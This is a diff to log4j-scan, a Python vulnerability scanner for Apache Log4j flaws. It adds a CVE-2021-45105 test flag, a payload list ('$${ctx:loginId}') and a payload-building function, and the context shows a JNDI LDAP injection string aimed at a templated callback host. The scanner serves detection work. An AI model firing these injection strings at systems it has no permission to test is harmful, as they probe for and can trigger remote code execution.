@@ -2,8 +2,9 @@
 # coding=utf-8
 # ******************************************************************
 # log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
-# Author:
+# Original Author:
 # Mazin Ahmed <Mazin at FullHunt.io>
+# Modified by Megan Howell (CyberQueenMeg)
 # Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
 # Secure your Attack Surface with FullHunt.io.
 # ******************************************************************
@@ -66,6 +67,10 @@ cve_2021_45046 = [
                   "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
                  ]  
 
+cve_2021_45105 = [
+                "$${ctx:loginId}"
+]
+
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -111,6 +116,10 @@ parser.add_argument("--waf-bypass",
 parser.add_argument("--test-CVE-2021-45046",
                     dest="cve_2021_45046",
                     help="Test using payloads for CVE-2021-45046 (detection payloads).",
+                    action='store_true')
+parser.add_argument("--test-CVE-2021-45105",
+                    dest="cve_2021_45105",
+                    help="Test using payloads for CVE-2021-45105 (detection payloads).",
                     action='store_true')
 parser.add_argument("--dns-callback-provider",
                     dest="dns_callback_provider",
@@ -172,6 +181,13 @@ def get_cve_2021_45046_payloads(callback_host, random_string):
         payloads.append(new_payload)
     return payloads
 
+def get_cve_2021_45105_payloads(callback_host, random_string):
+    payloads = []
+    for i in cve_2021_45105:
+        new_payload = i.replace("{{callback_host}}", callback_host)
+        new_payload = new_payload.replace("{{random}}", random_string)
+        payloads.append(new_payload)
+    return payloads
 
 class Dnslog(object):
     def __init__(self):
